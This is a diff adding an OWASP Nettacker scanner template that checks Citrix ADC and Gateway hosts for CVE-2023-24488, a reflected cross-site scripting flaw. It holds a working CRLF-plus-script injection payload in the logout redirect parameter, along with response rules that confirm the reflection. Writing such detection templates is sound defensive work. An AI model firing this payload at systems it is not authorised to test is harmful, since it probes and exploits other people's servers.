@@ -1,0 +1,48 @@
+info:
+  name: citrix_cve_2023_24488_vuln
+  author: OWASP Nettacker Team
+  severity: 6
+  description: CVE-2023-24488 - XSS Vulnerability in Citrix Application Delivery Controller and Citrix Gateway
+  reference: 
+    - https://support.citrix.com/article/CTX477714
+    - https://blog.assetnote.io/2023/06/29/binary-reversing-citrix-xss/
+    - https://blog.assetnote.io/2023/06/29/citrix-xss-advisory/
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - medium_severity
+    - cve
+    - citrix
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              paths:
+                - 'oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(%27vulnerable%27)</script>%27'
+              schema:
+                - "https"
+              ports:
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "302"
+              reverse: false
+            content:
+              regex: "alert\\('vulnerable'\\)"
+              reverse: false
